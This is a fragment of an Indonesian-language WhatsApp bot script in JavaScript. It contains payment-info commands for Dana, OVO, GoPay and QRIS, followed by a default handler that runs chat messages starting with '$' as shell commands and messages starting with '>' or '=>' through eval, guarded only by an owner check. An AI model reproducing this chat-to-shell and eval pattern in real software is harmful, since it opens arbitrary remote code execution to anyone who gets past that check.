await Skyzo.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "danapay": {
if (global.dana == false) return m.reply('Payment Dana Tidak Tersedia')
let teks = `
*Nomor Dana :*
${global.dana}

_Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!_
`
Skyzo.sendText(m.chat, teks, qkontak)
}
break
case "ovopay": {
if (global.ovo == false) return m.reply('Payment Ovo Tidak Tersedia')
let teks = `
*Nomor Ovo :*
${global.ovo}

_Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!_
`
Skyzo.sendText(m.chat, teks, qkontak)
}
break
case "gopaypay": {
if (global.gopay == false) return m.reply('Payment Gopay Tidak Tersedia')
let teks = `
*Nomor Gopay :*
${global.gopay}

_Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!_
`
Skyzo.sendText(m.chat, teks, qkontak)
}
break
case "qrispay": {
if (global.qris == false) return m.reply('Payment Qris Tidak Tersedia')
let teks = `
*Untuk Pembayaran Melalui QRIS All Payment, Silahkan Scan Foto QRIS Diatas Ini*

_Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!_
`
Skyzo.sendMessage(m.chat, {image: {url: global.qris}, caption: teks}, {quoted: qkontak})
}
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return Skyzo.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return Skyzo.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
Skyzo.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
Skyzo.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return Skyzo.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return Skyzo.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
Skyzo.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})